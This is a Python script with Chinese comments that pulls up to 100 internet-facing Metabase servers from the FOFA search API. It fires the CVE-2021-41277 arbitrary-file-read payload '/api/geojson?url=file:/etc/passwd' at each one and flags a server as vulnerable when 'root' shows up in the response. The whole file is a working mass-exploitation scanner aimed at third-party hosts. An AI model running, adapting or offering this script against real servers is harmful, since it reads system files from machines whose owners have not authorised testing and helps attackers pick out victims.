# coding: utf-8
import base64
import requests
import urllib3

def getURL():
    f = open('fofa.txt', 'r', encoding='utf-8')
    email = str(f.readline()).strip('email:')
    key = str(f.readline()).strip('key:')
    f.close()
    query = 'app="metabase"'
    query_bs64 = base64.b64encode(query.encode(encoding='utf-8')).decode()

    # 如果是高级会员或者企业会员的话，修改size为会员等级对应的可查询数据量
    urls = f'https://fofa.so/api/v1/search/all?email={email}&key={key}&qbase64={query_bs64}&size=100'
    result = requests.get(urls).json()["results"]
    return result

def vulnCheck():
    urls = list(getURL())
    vulnum = 0
    for i in range(0, 100):
        url = urls[i][0]
        payload = '/api/geojson?url=file:/etc/passwd'
        try:
            if 'http' not in url:
                response = str(requests.get('http://' + url + payload, timeout=3).content)
            else:
                urllib3.disable_warnings()
                response = str(requests.get(url + payload, verify=False, timeout=3).content)
        except BaseException:
            print(f'第{i + 1}次检测失败，指定url连接超时……')
            continue

        if 'root' in response:
            print(f'{url}:漏洞存在')
            vulnum += 1
        else:
            print(f'{url}:漏洞不存在')
        print(f'第{i + 1}次检测')
    print(f'有{vulnum}个漏洞！')

if __name__ == '__main__':
    print('#----------MetaBase 任意文件读取漏洞 CVE-2021-41277 批量漏洞验证程序---------#')
    print('#-------------------------------作者：kap-------------------------------#')
    vulnCheck()